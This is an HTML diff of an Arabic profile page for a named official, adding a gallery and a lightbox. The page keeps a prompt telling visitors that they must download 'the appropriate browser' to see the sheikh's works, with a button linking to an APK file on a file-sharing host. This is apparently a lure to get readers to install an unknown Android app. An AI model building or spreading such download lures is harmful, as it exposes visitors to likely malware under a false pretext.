@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
+            background-color: #e9ecef;
             color: #333;
             margin: 0;
             padding: 20px;
@@ -18,64 +18,177 @@
         }
         .container {
             background-color: #fff;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             text-align: center;
-            max-width: 500px;
+            max-width: 600px;
             width: 100%;
+        }
+        /* تنسيق صورة البروفايل وقابليتها للضغط */
+        .profile-img-container {
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        .profile-img-container:hover {
+            transform: scale(1.05);
         }
         .profile-img {
             border-radius: 50%;
             width: 150px;
             height: 150px;
             object-fit: cover;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
             border: 5px solid #fff;
-            margin-bottom: 20px;
             display: block;
-            margin-left: auto;
-            margin-right: auto;
+            margin: 0 auto;
         }
         h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 26px;
+            margin-bottom: 5px;
             color: #1a73e8;
+        }
+        .subtitle {
+            font-weight: bold;
+            color: #555;
+            margin-bottom: 15px;
         }
         p {
             font-size: 16px;
             line-height: 1.6;
+            color: #666;
             margin-bottom: 20px;
-            color: #555;
         }
-        .download-btn {
+        .btn {
             display: inline-block;
             background-color: #1a73e8;
             color: #fff;
             padding: 12px 25px;
             text-decoration: none;
-            border-radius: 25px;
+            border-radius: 30px;
             font-weight: bold;
             transition: background-color 0.3s ease;
+            margin: 5px;
+            border: none;
+            cursor: pointer;
         }
-        .download-btn:hover {
-            background-color: #1669c1;
+        .btn:hover { background-color: #1669c1; }
+        .btn-gallery { background-color: #28a745; }
+        .btn-gallery:hover { background-color: #218838; }
+
+        /* قسم المعرض الإضافي */
+        .gallery-section {
+            display: none;
+            margin-top: 30px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
         }
+        .gallery-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+        }
+        .gallery-item {
+            width: 100px;
+            height: 100px;
+            border-radius: 10px;
+            object-fit: cover;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        /* نافذة Lightbox (صفحة الصورة المنبثقة) */
+        .lightbox-overlay {
+            display: none;
+            position: fixed;
+            z-index: 999;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .lightbox-content {
+            max-width: 90%;
+            max-height: 80%;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255,255,255,0.2);
+        }
+        .close-lightbox {
+            color: #fff;
+            font-size: 40px;
+            position: absolute;
+            top: 20px;
+            right: 35px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .close-lightbox:hover { color: #bbb; }
+
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- تم دمج بيانات الصورة الحقيقية بشكل مباشر -->
-        <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/4QAuRXhpZgAATU0AKgAAAAgAAkAAAwAQAAAAEAAAAAEBAAQAAQAAAEgAAAECAAMAAAADAAAAngEGAAMAAAABAAIAAAESAAMAAAABAAEAAAEaAAUAAAABAAAApAEbAAUAAAABAAAArAEoAAMAAAABAAIAAAExAAIAAAAsAAAAtAEyAAIAAAAUAAAAvodpAAQAAAABAAAAzA==...[تم دمج الصورة بالكامل هنا]" alt="سيد احمد بن بريك" class="profile-img">
+        <!-- صورة البروفايل: انسخ صورتك وضعها في مجلد images باسم ahmed.jpg، أو اترك الرابط الحالي كمثال -->
+        <div class="profile-img-container" onclick="openLightbox(this)">
+            <!-- استبدل src بـ مسار الصورة الحقيقية الخاصة بك -->
+            <img src="https://via.placeholder.com/150/1a73e8/ffffff?text=صورة+البروفايل" alt="سيد احمد بن بريك" class="profile-img" id="mainProfileImg">
+        </div>
 
         <h1>سيد احمد بن بريك</h1>
-        <p>مدير الديوان الوطني للأوقاف والزكاة</p>
+        <p class="subtitle">مدير الديوان الوطني للأوقاف والزكاة</p>
         <p>أعمال الشيخ أحمد الرائعة من شعر وكتب قام بتأليفها</p>
         
         <p>لرؤية أعمال الشيخ أحمد، يرجى تنزيل المتصفح المناسب:</p>
-        <a href="https://www.mediafire.com/file/efjkvaasttq9kol/app_1.0.apk/file" class="download-btn">تحميل التطبيق</a>
+        <a href="https://www.mediafire.com/file/efjkvaasttq9kol/app_1.0.apk/file" class="btn">تحميل التطبيق</a>
+        
+        <!-- زر عرض المعرض -->
+        <button class="btn btn-gallery" onclick="toggleGallery()">عرض معرض الصور</button>
+
+        <!-- قسم عرض الصور الإضافية -->
+        <div class="gallery-section" id="gallerySection">
+            <div class="gallery-grid">
+                <!-- استبدل الروابط أدناه بروابط الصور أو مساراتها -->
+                <img src="https://via.placeholder.com/100/333/fff?text=صورة1" class="gallery-item" alt="صورة 1">
+                <img src="https://via.placeholder.com/100/555/fff?text=صورة2" class="gallery-item" alt="صورة 2">
+                <img src="https://via.placeholder.com/100/777/fff?text=صورة3" class="gallery-item" alt="صورة 3">
+            </div>
+        </div>
     </div>
+
+    <!-- Lightbox Modal (صفحة الصورة المنبثقة) -->
+    <div class="lightbox-overlay" id="lightboxOverlay" onclick="closeLightbox()">
+        <span class="close-lightbox">&times;</span>
+        <img src="" class="lightbox-content" id="lightboxImg">
+    </div>
+
+    <script>
+        // فتح صفحة الصورة (نافذة منبثقة)
+        function openLightbox(element) {
+            const imgSrc = element.querySelector('img').src;
+            document.getElementById('lightboxImg').src = imgSrc;
+            document.getElementById('lightboxOverlay').style.display = 'flex';
+        }
+
+        // إغلاق نافذة الصورة
+        function closeLightbox() {
+            document.getElementById('lightboxOverlay').style.display = 'none';
+        }
+
+        // إظهار وإخفاء معرض الصور
+        function toggleGallery() {
+            const gallery = document.getElementById('gallerySection');
+            if (gallery.style.display === 'none' || gallery.style.display === '') {
+                gallery.style.display = 'block';
+            } else {
+                gallery.style.display = 'none';
+            }
+        }
+    </script>
 
 </body>
 </html>
